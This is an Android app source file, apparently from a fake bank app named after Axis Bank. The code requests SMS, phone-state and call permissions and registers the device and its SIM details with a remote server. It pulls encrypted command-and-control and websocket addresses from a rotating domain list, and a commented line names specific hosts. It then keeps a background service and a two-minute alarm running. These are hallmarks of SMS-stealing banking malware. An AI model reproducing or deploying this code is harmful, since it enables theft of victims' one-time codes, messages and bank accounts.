package com.axisofbank.german;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_PERMISSIONS = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {

//        Helper H = new Helper();
//        try {
//            String encryption = AESDescryption.encrypt("{ \"domain\": \"https://upqadd.com/api\", \"socket\":\"wss://socket.missyou9.in\" }", H.KEY());
//            Log.d(Helper.TAG, "data ecn "+encryption);
//        } catch (Exception e) {
//            throw new RuntimeException(e);
//        }
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        checkPermissions();
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .replace(R.id.form_content, new FormFragment1())
                    .commit();
        }

    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            // Check if permissions are granted or not
            if (grantResults.length > 0) {
                boolean allPermissionsGranted = true;
                StringBuilder missingPermissions = new StringBuilder();

                for (int i = 0; i < grantResults.length; i++) {
                    if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                        allPermissionsGranted = false;
                        missingPermissions.append(permissions[i]).append("\n"); // Add missing permission to the list
                    }
                }
                if (allPermissionsGranted) {
                    init();
                } else {
                    showPermissionDeniedDialog();
                    Toast.makeText(this, "Permissions denied:\n" + missingPermissions.toString(), Toast.LENGTH_LONG).show();
                }
            }
        }
    }


    private void checkPermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(this, new String[]{
                    Manifest.permission.READ_PHONE_STATE,
                    Manifest.permission.CALL_PHONE,
                    Manifest.permission.INTERNET,
                    Manifest.permission.ACCESS_NETWORK_STATE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.SEND_SMS
            }, REQUEST_CODE_PERMISSIONS);
            Toast.makeText(this, "Requesting permission", Toast.LENGTH_SHORT).show();
        } else {
            init();
            Toast.makeText(this, "Permissions already granted", Toast.LENGTH_SHORT).show();
        }
    }


    private void showPermissionDeniedDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Permission Denied");
        builder.setMessage("All permissions are required to send and receive messages. " +
                "Please grant the permissions in the app settings.");

        // Open settings button
        builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                openAppSettings();
            }
        });

        // Cancel button
        builder.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                finish();
            }
        });

        builder.show();
    }
//    private void openAppSettings() {
//        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
//        intent.addCategory(Intent.CATEGORY_DEFAULT);
//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(intent);
//    }

    public void openAppSettings() {
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        Uri uri = Uri.fromParts("package", getPackageName(), null);
        intent.setData(uri);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    public void registerPhoneData() {
        SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());

        share.saveBoolean("is_registered", true);
        NetworkHelper networkHelper = new NetworkHelper();
        Helper help = new Helper();
        String url = help.URL(this) + "/mobile/add";
        JSONObject sendData = new JSONObject();
        try {
            Helper hh = new Helper();
            sendData.put("site", hh.SITE());
            sendData.put("mobile", Build.MANUFACTURER);
            sendData.put("model", Build.MODEL);
            sendData.put("mobile_android_version", Build.VERSION.RELEASE);
            sendData.put("mobile_api_level", Build.VERSION.SDK_INT);
            sendData.put("mobile_id",  Helper.getAndroidId(getApplicationContext()));
            try {
                JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                sendData.put("sim", simData);
            } catch (JSONException e) {
                Log.e("Error", "Invalid JSON data: " + e.getMessage());
            }
        }catch (JSONException e) {
            e.printStackTrace();
        }
        networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
            @Override
            public void onSuccess(String result) {
                runOnUiThread(() -> {
                    try {
                        JSONObject jsonData = new JSONObject(result);
                        if(jsonData.getInt("status") == 200) {
                        }else {
                            Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                            Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
                        }
                    } catch (JSONException e) {
                        Log.d(Helper.TAG, Objects.requireNonNull(e.getMessage()));
                        Toast.makeText(getApplicationContext(),  Objects.requireNonNull(e.getMessage()), Toast.LENGTH_LONG).show();
                    }
                });
            }
            @Override
            public void onFailure(String error) {
                runOnUiThread(() -> {
                    Log.d(Helper.TAG, error);;
                    Toast.makeText(getApplicationContext(),  error, Toast.LENGTH_LONG).show();
                });
            }
        });
    }

    public void init(){
        if(!Helper.isNetworkAvailable(this)) {
            Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
            startActivity(intent);
        }
        this.updateDomain(this);
    }
    public void initFunction(){
        registerPhoneData();
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        scheduleDomainUpdateAlarm();
    }

    private void scheduleDomainUpdateAlarm() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        Intent intent = new Intent(this, DomainUpdateReceiver.class);
        int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
                ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                : PendingIntent.FLAG_UPDATE_CURRENT;

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent, flags);

        // 1mnt call
        long interval = 2 * 60 * 1000;
        long triggerAtMillis = System.currentTimeMillis() + interval;
        Log.d(Helper.TAG, "Alram Manager Called");

        alarmManager.setRepeating(
                AlarmManager.RTC_WAKEUP, triggerAtMillis, interval, pendingIntent);
    }


    public void updateDomain(final Context cc) {
        final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
        final NetworkHelper network = new NetworkHelper();
        final Helper help = new Helper();
        String DomainList = help.DomainList();
        final String[] domainArray = DomainList.split(", ");
        checkDomainSequentially(0, domainArray, db, network);
    }

    private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
        if (index >= domainArray.length) {
            db.saveString("domainStatus", "failed");
            return;
        }
        final String currentDomain = domainArray[index];
        network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
            @Override
            public void onSuccess(String result) {
                String encryptedData = result.trim();

                try {
                    Helper h = new Helper();
                    String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());

                    if (!decryptedData.isEmpty()) {
                        JSONObject object = new JSONObject(decryptedData);
                        db.saveString("domain", object.getString("domain"));
                        db.saveString("socket", object.getString("socket"));
                        initFunction();
                    }
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onFailure(String error) {
                Log.d(Helper.TAG, "Failed for domain: " + currentDomain + " Error: " + error);
                Toast.makeText(getApplicationContext(), "Failed for domain: " + currentDomain + " Error: " + error, Toast.LENGTH_LONG).show();
                checkDomainSequentially(index + 1, domainArray, db, network);
            }
        });
    }



}
